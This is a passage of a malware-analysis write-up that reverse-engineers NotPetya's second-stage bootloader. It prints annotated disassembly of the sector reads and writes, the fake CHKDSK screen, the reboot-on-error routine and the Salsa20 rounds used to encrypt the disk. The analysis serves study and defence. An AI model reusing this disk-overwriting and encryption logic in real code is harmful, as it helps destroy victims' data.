Upon stepping in the function, another stack frame is created with size `0x0212`, the content of `DI` and `SI` are saved on the stack, `AL` is set to 0, then two three bytes on the stack are set to 0, then the value `0x7b78` is saved inside `SI`. Could that be and address? We don't know that, but we know that immediately after that, a jump is made to `0x8a99`.

Upon landing the jump, a value in compared to `0x10` from the stack. This value was previously set to zero by the code above. If the value on the stack is less than `0x10`, a jump is made to `0x8a7a`, in which we see that `AL` is set to 0, the value of the stack is saved to `BL`, `BH` is set to 0, then the `BX` register is left shifted by 3 bits, effectively multiplying `BX` by eight (if we don't count the 16th bit that gets removed). Then the content od the `SI` register gets added to `BX`. Now the addresses pointed by `BX + 4`, `BX + 2`, `BX + 1` and `BX` are all zeroed out, the the address pointed by `BX - 2` is incremented.

After that, the find outselves back to the infamous `CMP BYTE [BP - 2], 0x10` instruction.
We can note that this does nothing more that iterating the stack, and zeroing out some values, for 16 times.

I luckily took note of the zeroed addresses:
- `0x7b78, 0x7b79, 0x7b7a, 0x7b7c, 0x7b7d, 0x7b7e, 0x7b7f`
- `0x7b80, 0x7b81, 0x7b82, 0x7b84, 0x7b85, 0x7b86, 0x7b87`
- `0x7b88, 0x7b89, 0x7b8a, 0x7b8c, 0x7b8d, 0x7b8e, 0x7b8f`

- `0x7b90, 0x7b91, 0x7b92, 0x7b94, 0x7b95, 0x7b96, 0x7b97`
- `0x7b98, 0x7b99, 0x7b9a, 0x7b9c, 0x7b9d, 0x7b9e, 0x7b9f`
- `0x7ba0, 0x7ba1, 0x7ba2, 0x7ba4, 0x7ba5, 0x7ba6, 0x7ba7`

- `0x7ba8, 0x7ba9, 0x7baa, 0x7bac, 0x7bad, 0x7bae, 0x7baf`
- `0x7bb0, 0x7bb1, 0x7bb2, 0x7bb4, 0x7bb5, 0x7bb6, 0x7bb7`
- `0x7bb8, 0x7bb9, 0x7bba, 0x7bbc, 0x7bbd, 0x7bbe, 0x7bbf`

- `0x7bc0, 0x7bc1, 0x7bc2, 0x7bc4, 0x7bc5, 0x7bc6, 0x7bc7`
- `0x7bc8, 0x7bc9, 0x7bca, 0x7bcc, 0x7bcd, 0x7bce, 0x7bcf`
- `0x7bd0, 0x7bd1, 0x7bd2, 0x7bd4, 0x7bd5, 0x7bd6, 0x7bd7`

- `0x7bd8, 0x7bd9, 0x7bda, 0x7bdc, 0x7bdd, 0x7bde, 0x7bdf`
- `0x7be0, 0x7be1, 0x7be2, 0x7be4, 0x7be5, 0x7be6, 0x7be7`
- `0x7be8, 0x7be9, 0x7bea, 0x7bec, 0x7bed, 0x7bee, 0x7bef`

- `0x7bf0, 0x7bf1, 0x7bf2, 0x7bf4, 0x7bf5, 0x7bf6, 0x7bf7`

Or, if you prefer the cleaner way, all the addresses ranging from `0x7b78` to `0x7bf7` but `0x7b7b, 0x7b83, 0x7b8b, 0x7b93, 0x7b9b, 0x7ba3, 0x7bab, 0x7bb3, 0x7bbb, 0x7bc3, 0x7b7cb, 0x7bd3, 0x7bdb, 0x7be3, 0x7beb, 0x7bf3`. I don't know why those addresses were spared, but we might know while reversing more code.

After exiting the loop, we see that the address used to count the loop iterations is zeroed out too, and the address `0x7960` is saved in the stack. Then we see that `0x80` is pushed in the stack too, followed by a call to `fcn.00008b9a`. Let's quickly check what this function does.

##### fcn.00008b9a
Inside `fcn.00008b9a`, we immediately see that another stack frame is set, with size `0x8`. Immediately after, the number `0x80` is retrieved from it into `DL`, and with the value `0x8` being assigned to `AH`, the `INT 0x13` is invoked.

Now things get spicy, because this time the interrupt retrieves some drive parameters that the malware stores in memory. Those parameters are the following:
- The interrupt exit code, stored in `AH`
- The cylinders number, stored in `CH`
- The sectors number, stored in `CL`

- The heads number, stored in `DH`

After that, the malware checks if there has been errors during the interrupt invocation and in that case a jump is made to address `0x8bde`. In the other case however, the sectors number is retrieved from memory, put in `AL`, a logical `AND` is performed on it, alongside with a left shift by 2 bits. Then, the cylinders number is stored in `CL`, and the `CX` register is cleared and a logical `OR` is done between `AX` and `CX`.

Then, the strange `0x7960` value is put from the stack in `BX`. `AX` is now incremented by one, and its value is store in address `0x7960`. Now the heads number is stored in `AL`, and then saved into the address `0x7962`. Also, a logical `AND` is performed on `AL`, then a jump is made to address `0x8bea`. Here, the value of the error code of the interrupt `0x13` is stored in `AL`.

There are no cross references to this function, so it's safe to assume that all it does is simply gathering the information about the drive. I'll rename the function `x`. Here is the disassembly of the function:

```s
0000:8b9a      enter   8, 0
0000:8b9e      push    es
0000:8b9f      mov     dl, byte [bp + 4]            ; Drive number

0000:8ba2      mov     ah, 8                        ; Op. code for gathering drive informations
0000:8ba4      int     0x13
0000:8ba6      mov     byte [bp - 8], ah            ; Save the exit code

0000:8ba9      mov     byte [bp - 2], ch            ; Save the cylinders number
0000:8bac      mov     byte [bp - 6], cl            ; Save the sectors number
0000:8baf      mov     byte [bp - 4], dh            ; Save the heads number

0000:8bb2      pop     es
0000:8bb3      cmp     byte [bp - 8], 0             ; Check if there was en error during the gathering of the drive information
0000:8bb7      jne     0x8bde                       ; In error case, skip the following code snippet

0000:8bb9      mov     al, byte [bp - 6]            ; Retrieve the sectors number
0000:8bbc      and     ax, 0xc0                     ; Presumably checks if the drive has more than 31 sectors
0000:8bbf      shl     ax, 2

0000:8bc2      mov     cl, byte [bp - 2]            ; Retrieve the cylinders number
0000:8bc5      sub     ch, ch
0000:8bc7      or      ax, cx                       ; OR the value of the cylinders and AX

0000:8bc9      mov     bx, word [bp + 6]            ; In this address is present "0x7960"
0000:8bcc      inc     ax
0000:8bcd      mov     word [bx], ax                ; Save the stange OR from AX and cylinders into address 0x7960

0000:8bcf      mov     al, byte [bp - 4]            ; Get the heads number
0000:8bd2      inc     al
0000:8bd4      mov     byte [bx + 2], al            ; Save them inside into address 0x7962

0000:8bd7      mov     al, byte [bp - 6]            ; Get the sectors number, again
0000:8bda      and     al, 0x3f
0000:8bdc      jmp     0x8bea

0000:8bde      mov     bx, word [bp + 6]            ; In case of errors, get the address "0x7960" and store it in BX
0000:8be1      xor     al, al
0000:8be3      mov     word [bx], 0                 ; Put 0 into 0x7960 and 0x7961

0000:8be7      mov     byte [bx + 2], al            ; And zero into 0x7962
0000:8bea      mov     byte [bx + 3], al            ; And zero into 0x7963
0000:8bed      mov     al, byte [bp - 8]            ; Save in AL the exit code error

0000:8bf0      leave
0000:8bf1      ret
```

##### Back to fcn.00008a64
Now we're back to `fcn.00008a64`. In here we see that the two elements on the top of the stack are removed, and then a check is made on `AL`. If it's 0, some values get pushed into the stack, the address `0x7760` is pushed into the stack, then the last parameter pushed into the stack is put into `AL`, added to `0x80` and then pushed back into the stack. Then, `fcn.00008a64` is called.

##### fcn.00008a5a
We immediately see that this function has cross references, which means that the seemingly random values we saw being pushed into the stack may not be very random.
There are some copies to the stack variables into the stack frame, but the most notables are the one with addresses `0x7760` and `0x7732`. After some other parameters copying, we see that address `0x7780` is pushed into the stack, before a call to `fcn.00008bf2`.

##### fcn.00008bf2
Inside `fcn.00008bf` we see again, a stack frame being allocated with 6 bytes, alongside with some other seemingly random address copying. The we see that the `0x55aa` value is put in `EBX`. This caught my attention because this is the MBR magic number. Shortly after, the `INT 0x13` is invoked. This is again the call to read the drive sectors. We can follow the `DS:SI` address to have a look at the DAP structure: `10 00 01 00 60 77 00 00 00 00 00 00 00 00 00 00`. We can see that it's reading one sector, which is going to be saved at the address `0x7760`. This is however reading sector number 0, the sector where the MBR resides.

After that, if the read wasn't successfull, it simply tries again to read the MBR. We can rename for now this structure `readSectorAndStoreIntoMemory`, just because the previous function has tons of cross references, which might be user to call the function with other parameters and thus, changing its behavior. This is the disassembly:

```s
0000:8bf2      enter   6, 0
0000:8bf6      push    di
0000:8bf7      push    si

0000:8bf8      mov     bx, word [bp + 6]
0000:8bfb      mov     byte [bx], 0x10
0000:8bfe      mov     byte [bx + 1], 0

0000:8c02      mov     ax, word [bp + 0x10]
0000:8c05      mov     word [bx + 2], ax
0000:8c08      lea     di, [bx + 8]

0000:8c0b      lea     si, [bp + 8]
0000:8c0e      push    ds
0000:8c0f      pop     es

0000:8c10      movsd   dword es:[di], dword ptr [si]
0000:8c12      movsd   dword es:[di], dword ptr [si]
0000:8c14      cmp     byte [bp + 0x12], 1

0000:8c18      sbb     al, al                               ; Make AL = 0xff
0000:8c1a      and     al, 0xff
0000:8c1c      add     al, 0x43                             ; Make AL = 0x43

0000:8c1e      mov     byte [bp - 2], al
0000:8c21      mov     byte [bp - 6], 3
0000:8c25      mov     byte [bp - 4], 0

0000:8c29      mov     bx, 0x55aa
0000:8c2c      mov     dl, byte [bp + 4]
0000:8c2f      mov     si, word [bp + 6]

0000:8c32      mov     ah, byte [bp - 2]
0000:8c35      xor     al, al
0000:8c37      int     0x13                                 ; Save the MBR into address 0x7760

0000:8c39      jae     0x8c3e                               ; If the read was successfull
0000:8c3b      mov     byte [bp - 4], ah
0000:8c3e      cmp     byte [bp - 4], 0x11

0000:8c42      jne     0x8c48
0000:8c44      mov     byte [bp - 4], 0
0000:8c48      cmp     byte [bp - 4], 0

0000:8c4c      je      0x8c53
0000:8c4e      dec     byte [bp - 6]
0000:8c51      jne     0x8c25

0000:8c53      mov     al, byte [bp - 4]
0000:8c56      pop     si
0000:8c57      pop     di

0000:8c58      leave
0000:8c59      ret
```

##### Back to fcn.00008a5a
Unfortunately, with such small pieces of information it's hard to get a complete idea of what this function may do. For now, we'll just assume it stores a sector into memory, so we'll rename the function `storeSectorIntoMemory`. This is what the function looks like:

```s
0000:8c5a      enter   0x18, 0                  ; Create a stack frame with 0x18 bytes
0000:8c5e      mov     ax, word [bp + 6]
0000:8c61      mov     word [bp - 0x14], ax

0000:8c64      mov     word [bp - 0x12], 0
0000:8c69      mov     dword [bp - 4], 0
0000:8c71      mov     eax, dword [bp + 8]

0000:8c75      mov     dx, word [bp + 0xa]
0000:8c78      mov     dword [bp - 8], eax
0000:8c7c      mov     al, byte [bp + 0xe]

0000:8c7f      push    ax
0000:8c80      push    word [bp + 0xc]
0000:8c83      push    dword [bp - 4]

0000:8c87      push    dx
0000:8c88      push    word [bp - 8]
0000:8c8b      lea     ax, [bp - 0x18]

0000:8c8e      push    ax
0000:8c8f      mov     al, byte [bp + 4]
0000:8c92      push    ax

0000:8c93      call    readSectorAndStoreIntoMemory
0000:8c96      leave
0000:8c97      ret
```

##### Back to fcn.00008a64
After the call to `storeSectorIntoMemory`, we see that a copy of the pointer to the copied sector is saved into `0x796c`. The we see that the code checks if the sector copied ends with `0xaa55`. After that, some logic goes on for a long time. I looked at the dumped memory after all the logic, but it seems that it doesn't do anything really apparent.

We can't easily tell what this function does, for now, we'll just rename this function `storeSectorInMemoryAndDoLogic`. This is what the disassembly looks like here:

```s
0000:8a64      enter   0x212, 0
0000:8a68      push    di
0000:8a69      push    si

0000:8a6a      xor     al, al
0000:8a6c      mov     byte [bp - 0xb], al
0000:8a6f      mov     byte [bp - 1], al

0000:8a72      mov     byte [bp - 2], al
0000:8a75      mov     si, word [bp + 4]
0000:8a78      jmp     0x8a99

0000:8a7a      xor     al, al
0000:8a7c      mov     bl, byte [bp - 2]
0000:8a7f      sub     bh, bh

0000:8a81      shl     bx, 3
0000:8a84      add     bx, si
0000:8a86      mov     byte [bx + 2], al

0000:8a89      mov     byte [bx + 1], al
0000:8a8c      mov     byte [bx], al
0000:8a8e      mov     dword [bx + 4], 0

0000:8a96      inc     byte [bp - 2]
0000:8a99      cmp     byte [bp - 2], 0x10
0000:8a9d      jb      0x8a7a

0000:8a9f      mov     byte [bp - 2], 0
0000:8aa3      lea     ax, [bp - 0x10]
0000:8aa6      push    ax

0000:8aa7      mov     al, byte [bp - 2]
0000:8aaa      add     al, 0x80
0000:8aac      push    ax

0000:8aad      call    gatherDriveInformations
0000:8ab0      add     sp, 4                            ; Remove the first two items from the stack
0000:8ab3      or      al, al                           ; Check if AL is 0

0000:8ab5      jne     0x8b87
0000:8ab9      push    0                                ; Push 4 times into the stack
0000:8abb      push    1                                ;

0000:8abd      push    0                                ;
0000:8abf      push    0                                ;
0000:8ac1      lea     ax, [bp - 0x210]

0000:8ac5      push    ax
0000:8ac6      mov     al, byte [bp - 2]
0000:8ac9      add     al, 0x80

0000:8acb      push    ax
0000:8acc      call    storeSectorIntoMemory
0000:8acf      add     sp, 0xc

0000:8ad2      or      al, al                           ; Set the ZF
0000:8ad4      jne     0x8aec                           ; Jump if ZF = 0
0000:8ad6      mov     dword [bp - 0xa], 0

0000:8ade      lea     ax, [bp - 0x210]
0000:8ae2      mov     word [bp - 4], ax                ; Save the address of the copied sector into address the stack frame
0000:8ae5      cmp     word [bp - 0x12], 0xaa55         ; Check if the copied sector is the MBR one

0000:8aea      je      0x8aef                           ; If the sector contains the MBR
0000:8aec      jmp     0x8b87
0000:8aef      mov     byte [bp - 1], 0

0000:8af3      mov     di, word [bp - 1]
0000:8af6      and     di, 0xff
0000:8afa      shl     di, 4

0000:8afd      lea     bx, [bp + di - 0x210]
0000:8b01      mov     eax, dword [bx + 0x1c6]
0000:8b06      add     eax, dword [bx + 0x1ca]

0000:8b0b      mov     dword [bp - 6], eax
0000:8b0f      mov     dx, word [bp - 4]
0000:8b12      cmp     eax, dword [bp - 0xa]

0000:8b16      jbe     0x8b1e
0000:8b18      mov     word [bp - 0xa], ax
0000:8b1b      mov     word [bp - 8], dx

0000:8b1e      inc     byte [bp - 1]
0000:8b21      cmp     byte [bp - 1], 4
0000:8b25      jb      0x8af3

0000:8b27      mov     bl, byte [bp - 0xb]
0000:8b2a      sub     bh, bh
0000:8b2c      shl     bx, 3

0000:8b2f      mov     byte [bx + si + 1], 1
0000:8b33      mov     byte [bp - 1], 0
0000:8b37      cmp     byte [bp - 1], 4

0000:8b3b      jae     0x8b63
0000:8b3d      mov     bl, byte [bp - 1]
0000:8b40      sub     bh, bh

0000:8b42      mov     di, bx
0000:8b44      mov     al, byte [bx - 0x6578]
0000:8b48      mov     word [bp - 0x212], bx

0000:8b4c      cmp     byte [bp + di - 0x210], al
0000:8b50      jne     0x8b57
0000:8b52      inc     byte [bp - 1]

0000:8b55      jmp     0x8b37
0000:8b57      mov     bl, byte [bp - 0xb]
0000:8b5a      sub     bh, bh

0000:8b5c      shl     bx, 3
0000:8b5f      mov     byte [bx + si + 1], 0
0000:8b63      mov     bl, byte [bp - 0xb]

0000:8b66      sub     bh, bh
0000:8b68      shl     bx, 3
0000:8b6b      add     bx, si

0000:8b6d      mov     byte [bx + 2], 1
0000:8b71      mov     al, byte [bp - 2]
0000:8b74      add     al, 0x80

0000:8b76      mov     byte [bx], al
0000:8b78      mov     eax, dword [bp - 0xa]
0000:8b7c      mov     dword [bx + 4], eax

0000:8b80      inc     byte [bp - 0xb]
0000:8b83      mov     byte [bp - 1], 1
0000:8b87      inc     byte [bp - 2]

0000:8b8a      cmp     byte [bp - 2], 0x10
0000:8b8e      jb      0x8aa3
0000:8b92      mov     al, byte [bp - 1]

0000:8b95      pop     si
0000:8b96      pop     di
0000:8b97      leave

0000:8b98      ret
```

##### Back to address 0x0000:0x84e8
Back to address `0x0000:0x84e8`, after the function call a value is popped out from the stack in `BX`. This value is `0x7b78`, perhaps may it be an address. It doesn't seem to be anything interesting on this address, so we'll just pretend that it's nothing relevant now. Anyways, after this `POP` instruction the `ZF` is set based on the content of `AL`, and if it's not set a jump is made into address `0x8506`, effectively skipping a call to `fcn.0000891e` and the return.

Let's check what's inside `fcn.0000891e`.

#### handleErrorAndReboot
##### fcn.0000891e
Upon first inspection, we see the function `clsAndPutWordInBX`, followed by an address with a string being pushed in the stack. The string contains the following text: `"ERROR!\r\n"`. Probably this function simply prints the string, and handles the error. However, the `INT 0x19` catches my attention now. This is the interrupt description according to **Ralf Brown Interrupt List**:

*This interrupt reboots the system without clearing memory or restoring interrupt vectors.  Because interrupt vectors are preserved, this interrupt usually causes a system hang if any TSRs have hooked vectors from 00h through 1Ch, particularly INT 08.*

*Notes: Usually, the BIOS will try to read sector 1, head 0, track 0 from drive A: to 0000h:7C00h. If this fails, and a hard disk is installed, the BIOS will read sector 1, head 0, track 0 of the first hard disk. This sector should contain a master bootstrap loader and a partition table (see #00650). After loading the master boot sector at 0000h:7C00h, the master bootstrap loader is given control (see #00653). It will scan the partition table for an active partition, and will then load the operating system's bootstrap loader (contained in the first sector of the active partition) and give it control.*

*Note (this time from me): while heads' and cylinders' numbering starts from 0, sectors' one starts from 1...*

All and all, what this code does is simply "soft" rebooting the computer, and making the BIOS restart the malicious payload execution. But there are two functions here that could be quite interesting. Would be a shame if we didn't check them out, whouldn't it be?

We'll be fast here, as those functions are likely to contain error handling code.

##### fcn.000085de
Inside `fcn.000085de` we don't see anything interesting besides another function call, this time `fcn.000085ce`.

##### fcn.000085ce
Here we see the `INT 0x10` being invoked, and all it does is simply printing out a character (yes that what it does lol). Here is the disassembly:

```s
0000:85ce      push    bp                   ; Again, another stack frame
0000:85cf      mov     bp, sp               ;
0000:85d1      mov     bx, 7                ; Page number

0000:85d4      mov     al, byte [bp + 4]    ; Character to print
0000:85d7      mov     ah, 0xe              ; Print code
0000:85d9      int     0x10

0000:85db      leave
0000:85dc      ret
```

I'll just rename this function to `printChar`.

##### Back to fcn.000085de
We see that this function iterates through the characters of the string pushed into the stack prior to the call. I'll rename this function `printPushedString`. Here is the disassembly:

```s
0000:85de      enter   2, 0
0000:85e2      push    si
0000:85e3      mov     si, word [bp + 4]        ; Move the address of the string into ESI

0000:85e6      jmp     0x85f0                   ; Jump to the LODSB instruction
0000:85e8      mov     al, byte [bp - 1]
0000:85eb      push    ax

0000:85ec      call    printChar
0000:85ef      pop     bx
0000:85f0      lodsb   al, byte [si]            ; Load the character of the string inside AL

0000:85f1      mov     byte [bp - 1], al        ; Save the character into the stack frame
0000:85f4      or      al, al                   ; Check if AL is zero (if we are at the end of the string)
0000:85f6      jne     0x85e8                   ; If not, print the character

0000:85f8      pop     si
0000:85f9      leave
0000:85fa      ret
```


##### fcn.0000896a, fcn.00008972, fcn.0000899a
Inside here nothing interesting, besides a call to `fcn.00008972`, which then calls `fcn.0000899a`. The general idea is that it checks for a key stroke, and when it gets the key, it justs saves it. All and all, I'll just rename `fcn.0000896a` to `getKeyStroke`. I'm not pasting here the code, as it's not relevant by any means, but feel free to check the cutter project called `SecondStage.rzdb` if you want to have a look at the functions yourself.

##### Back to fcn.0000891e
Overall, this function does nothing more that display the error message on the screen, then after a key is pressed, the computer is "soft" rebooted.
Here is the disassembly code:

```s
0000:891e      push    bp
0000:891f      mov     bp, sp
0000:8921      call    clsAndPutWordInBX

0000:8924      push    str.ERROR                ; 0xa2a8
0000:8927      call    printPushedString
0000:892a      pop     bx

0000:892b      call    getKeyStroke
0000:892e      int     0x19
0000:8930      leave

0000:8931      ret
```

We'll rename this function `handleErrorAndReboot`.

#### encryptDrive
##### Back to address 0x0000:0x84e8
Aside from the error handling we saw earlier, the malware zeroes out 6 bytes starting from address `0x7bf8`, then some logic is performed, untill we see a call to `storeSectorIntoMemory`. As it turns out, one of the value pushed into the stack is the sector number, in this case `0x20`, or sector `32`, another value is the address where to store the sector, in this case `0x7978`, and the last one I was able to figure out was the drive number, `0x80`.

After that we see that interestingly a comparison is made on the first byte of the stored sector. If the byte is 0 (mind you that the `JB` instruction checks for unsigned numbers), it jumps to address `0x85b8` where after some parameter pushing `fcn.0000811a` is called. Else the function flow continues as after some other parameter pushing, `fcn.00008426` is called.

In our case, the first byte of sector `32` is `0`, so first we'll follow `fcn.0000811a`. But before jumping into the function lets see if we can figure out some of its parameter. The first parameter pushed is `0x80`, which is likely the drive number. The second and third pushed values are `0x1000` and `0x0`. Right now I don't know the purpose of those values. The forth value pushed is the address `0x7978`, which is the starting address of our dumped sector into the memory.

##### fcn.0000811a
Inside `fcn.0000811a` we see a stack frame being created, followed by a call to `printPushedString`. This string contains the infamous NotPetya's "CHKSDK" message:

```
Repairing file system on C: 

The type of the file system is NTFS.
One of your disks contains errors and needs to be repaired. This process
may take several hours to complete. It is strongly recommended to let it
complete.

WARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS, YOU COULD
DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED
IN!
```

We can confirm that the string is being printed on the screen by looking at the Bochs main window. After that, we can see that some other parameters are being pushed, and a call to `storeSectorInMemory` is made. We know three parameters which the function uses, the sector number, the address in which the sector will be written and the drive number.

Now we see that if AL is not 0, the function `handleErrorAndReboot` is called, rebooting the computer.

Instead, it AL is 0, we see that the first byte of sector `32` is changed into `0x1`. Next we see that addresses from `0x6746` to `0x6749` are zeroed out, followed by a jump to address `0x815b`. Now we see that the previously zeroed out sectors are compared to `0x20`. If the addresses contains more or the same value, a jump is made to address `0x8176`.

In our case, this address is full of zeroes, so the jump is not made. We can now see that 32 bytes are being moved starting by the second byte of sector `32` to addresses from `0x674a` to `0x6769`. Those bytes are the following: `7E 63 AC D8 B2 29 DC 16 03 70 71 0C E6 02 86 11 60 7E F9 B8 83 09 61 F5 DC 7D 5B 8F 27 D9 2E AE`.

This is the function snippet, in case you're curious:

```s
0000:8156      inc     dword [bp - 0x1224]              ; Increment the number of bytes copied

0000:815b      cmp     dword [bp - 0x1224], 0x20        ; Check if 32 bytes have been copied
0000:8161      jae     0x8176
0000:8163      mov     si, word [bp - 0x1224]           ; Copy the second byte of sector 32 into address 0x6746

0000:8167      mov     al, byte [bp + si - 0x1ff]       ;
0000:816b      mov     byte [bp + si - 0x1220], al      ;
0000:816f      mov     byte [bp + si - 0x1ff], 0        ;

0000:8174      jmp     0x8156
0000:8176      sub     eax, eax
0000:8179      mov     dword [bp - 0x1224], eax         ; Zero out the byte copy counter

0000:817e      jmp     0x8185
```

Now we see another snippet which is a bit more complicated than the previous one:

Again, this is the snippet:

```s
0000:8180      inc     dword [bp - 0x1224]

0000:8185      cmp     dword [bp - 0x1224], 0x20
0000:818b      jae     0x81a6
0000:818d      push    1

0000:818f      push    1
0000:8191      push    0
0000:8193      push    0x20                         ; Sector number

0000:8195      lea     ax, [bp - 0x200]
0000:8199      push    ax
0000:819a      mov     al, byte [bp + 0xa]          ; Drive number, 0x80

0000:819d      push    ax
0000:819e      call    storeSectorIntoMemory
0000:81a1      add     sp, 0xc

0000:81a4      jmp     0x8180
```

Now you may think that this is just copying sector 32 into the address contained in `BP - 0x200`, but I want to drag your attention into those `PUSH` instructions:

```s
0000:818d      push    1

0000:818f      push    1
0000:8191      push    0
```

They are similar, but not the same as some other parameter pushed when this function was called. Take for example this snippet from before:

```s
0000:8126      push    0
0000:8128      push    1
0000:812a      push    0

0000:812c      push    0x20                         ; Sector number
0000:812e      lea     ax, [bp - 0x200]             ; Buffer where to save the sector
0000:8132      push    ax

0000:8133      mov     al, byte [bp + 0xa]          ; Drive number
0000:8136      push    ax
0000:8137      call    storeSectorIntoMemory
```

You can see that a pushed parameter is not 0, but 1 this time. And checking before the invocation of `INT 0x13` we see that if this push is set to 1, this function perform a write, not a read. We can also check out the DAP at address `DS:SI`: `10 00 01 00 6a 77 00 00 20 00 00 00 00 00 00 00`.
We see that it's copying over 1 block, from address `0x776a`, writing them to sector `0x20`, which is exactly sector `32`.

This loop however doesn't seem usefull at all, as it's writing the same buffer 32 times into sector `32`, and freeing the stack frame. Here is the code snippet, maybe you'll figure out what this code does better than me:

```s
0000:8180      inc     dword [bp - 0x1224]          ; This code snippet copies over 32 times data from address 0x776a to sector 32

0000:8185      cmp     dword [bp - 0x1224], 0x20
0000:818b      jae     0x81a6
0000:818d      push    1                            ; This magic value trasnform our storeSectorIntoMemory to writeSectorFromMemory

0000:818f      push    1
0000:8191      push    0
0000:8193      push    0x20                         ; Sector number

0000:8195      lea     ax, [bp - 0x200]             ; Memory address
0000:8199      push    ax
0000:819a      mov     al, byte [bp + 0xa]          ; Drive number

0000:819d      push    ax
0000:819e      call    storeSectorIntoMemory
0000:81a1      add     sp, 0xc                      ; The only purpose I can think of this function is to free the stack frame

0000:81a4      jmp     0x8180
```

After this strange code, we see that sector `33` is read into address `0x676a`. Interestingly, this sector is interely filled with `0x07`, which by the way is what our original mbr was xored with.

Next up we see that some other things are pushed into the stack, including `0x0`, `0x200`, the memory address of sector `33` (address `0x676a`), `0x0`, `0x0`, and the address of our 32 bytes from sector `32` (address `0x778b`), and finally address `0x674a`, which right now contains the value `0x8`. Then `fcn.00009798` is called.

##### fcn.00009798
Saying that this function is a mess, it's quite a big understatement. There is a ton of logic going on here. However, we see that whatever is going on in this function results in sector `33` being totally scrambled arround, probably encrypted. We are aware that the malware encrypts `NTFS's Master File Table`, but sector `33` is not part of the `MFT`. Could this function be the encryption routine?

The only thing we can do it trying to get as much crucial pieces of information as possible about this function which may be related to an encryption algorithm. We know that NotPetya uses `Salsa20`, so we should at least the `Quarter Round` function, alongsize the `SHL` and `SHR` instructions, as they are the core or the encryption logic. You can see more details on the [wikipedia](https://en.wikipedia.org/wiki/Salsa20) page.

##### fcn.00008036
We can see a function called `fcn.00008036`, which is a rather small function, but a slight detail caught my attention: it's a loop, that left shifts, which continues untill `CX` is 0. This is the disassembly:

```s
0000:8036      xor     ch, ch
0000:8038      jcxz    0x8040

0000:803a      shl     ax, 1
0000:803c      rcl     dx, 1
0000:803e      loop    0x803a

0000:8040      ret
```

We can track the value of `CX` with Bochs right before the first jump instruction.
As we expected, in the first function call `CX` is `7`. If we keep stepping on the same function, as expected we see that values `9`, `13` and `18`. Those are exactly the values used by the `leftShift` function used by `Salsa20`. We'll rename this function accordingly.

If we have a left shift function, we must have a right shift one too. And looking at `fcn.00009462` we see that after `fcn.0000810c` and `leftShift` functions are called, we see that two logical `OR` operations are performed. This must be the `ROTL` function, so we'll rename it accordingly.

##### fcn.0000810c
And as we thought here we have the `rightShift` function:

```s
0000:810c      xor     ch, ch
0000:810e      jcxz    0x8116

0000:8110      shr     dx, 1
0000:8112      rcr     ax, 1
0000:8114      loop    0x8110

0000:8116      ret
```

##### fcn.00009462
I'm not going to check if this function performs the right ammount of right shifts according to `Salsa20`, as we can tell that from the disassembly:

```s
0000:9462      enter   2, 0
0000:9466      push    di
0000:9467      push    si

0000:9468      mov     si, word [bp + 8]
0000:946b      mov     ax, word [bp + 4]
0000:946e      mov     dx, word [bp + 6]

0000:9471      mov     cl, 0x20                 ; 32 - x right shifts
0000:9473      mov     bx, si                   ;
0000:9475      sub     cl, bl                   ;

0000:9477      mov     word [bp - 2], si
0000:947a      call    rightShift
0000:947d      mov     cx, ax

0000:947f      mov     bx, dx
0000:9481      mov     ax, word [bp + 4]
0000:9484      mov     dx, word [bp + 6]

0000:9487      mov     si, cx
0000:9489      mov     cl, byte [bp - 2]        ; Left shifts
0000:948c      mov     di, bx

0000:948e      call    leftShift
0000:9491      or      ax, si
0000:9493      or      dx, di

0000:9495      pop     si
0000:9496      pop     di
0000:9497      leave

0000:9498      ret
```

##### fcn.0000949a
We can now step back again, and out suspects get confirmet quickly as we see another familiar function: `quarterRound`, the core `Salsa20` operation. This is what this function looks like:

```s
0000:949a      push    bp
0000:949b      mov     bp, sp
0000:949d      push    di

0000:949e      push    si
0000:949f      mov     di, word [bp + 0xa]
0000:94a2      mov     si, word [bp + 6]

0000:94a5      push    7
0000:94a7      mov     ax, word [di]
0000:94a9      mov     bx, word [bp + 4]
0000:94ac      mov     dx, word [di + 2]

0000:94af      add     ax, word [bx]
0000:94b1      adc     dx, word [bx + 2]
0000:94b4      push    dx

0000:94b5      push    ax
0000:94b6      call    ROTL
0000:94b9      add     sp, 6

0000:94bc      xor     word [si], ax
0000:94be      xor     word [si + 2], dx
0000:94c1      push    9

0000:94c3      mov     ax, word [si]
0000:94c5      mov     bx, word [bp + 4]
0000:94c8      mov     dx, word [si + 2]

0000:94cb      add     ax, word [bx]
0000:94cd      adc     dx, word [bx + 2]
0000:94d0      push    dx

0000:94d1      push    ax
0000:94d2      call    ROTL
0000:94d5      mov     bx, word [bp + 8]

0000:94d8      add     sp, 6
0000:94db      xor     word [bx], ax
0000:94dd      xor     word [bx + 2], dx

0000:94e0      push    13
0000:94e2      mov     eax, dword [si]
0000:94e5      add     eax, dword [bx]

0000:94e8      push    eax
0000:94ea      call    ROTL
0000:94ed      add     sp, 6

0000:94f0      xor     word [di], ax
0000:94f2      xor     word [di + 2], dx
0000:94f5      push    18

0000:94f7      mov     ax, word [di]
0000:94f9      mov     bx, word [bp + 8]
0000:94fc      mov     dx, word [di + 2]

0000:94ff      add     ax, word [bx]
0000:9501      adc     dx, word [bx + 2]
0000:9504      push    dx

0000:9505      push    ax
0000:9506      call    ROTL
0000:9509      mov     bx, word [bp + 4]

0000:950c      add     sp, 6
0000:950f      xor     word [bx], ax
0000:9511      xor     word [bx + 2], dx

0000:9514      pop     si
0000:9515      pop     di
0000:9516      leave

0000:9517      ret
```

##### fcn.000095d8, fcn.00009578, fcn.00009518
Now, looking at the cross referces of the `quarterRound` function, we see that the total calls to this functions are 8, 4 from `fcn.000095ec` and 4 from `fcn.00009578`. Those must define the `oddRound` and `evenRound`.

We can differentiate the two by looking at the call order. According to Wikipedia, the oddRound is the first to be called, followed by the evenRound:

```
// Odd round
QR( 0,  4,  8, 12) // column 1
QR( 5,  9, 13,  1) // column 2
QR(10, 14,  2,  6) // column 3
QR(15,  3,  7, 11) // column 4

// Even round
QR( 0,  1,  2,  3) // row 1
QR( 5,  6,  7,  4) // row 2
QR(10, 11,  8,  9) // row 3
QR(15, 12, 13, 14) // row 4
```

In order to do that, we can just look at the cross references of the functions, and they all brings us to `fcn.000095d8`. We now see that `fcn.00009578` performs the `oddRound` and fcn.00009518 performs the `evenRound`. We can rename those accordingly, and `fcn.000095d8` to `doubleRound`.

